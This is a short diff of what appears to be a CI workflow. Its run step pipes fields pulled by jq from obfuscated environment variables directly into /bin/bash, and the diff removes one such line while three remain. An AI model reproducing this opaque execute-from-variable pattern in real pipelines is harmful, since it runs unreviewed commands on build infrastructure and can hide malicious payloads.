@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$pzi9" | jq -r .nl37 | /bin/bash
           echo $mhjgz20 | jq -r .oopvc57195 | /bin/bash
-          echo $zvi58336 | jq -r .qigd158 | /bin/bash
           echo $zqlqi15941 | jq -r .dlv636 | /bin/bash
 
       - name: Store artifact
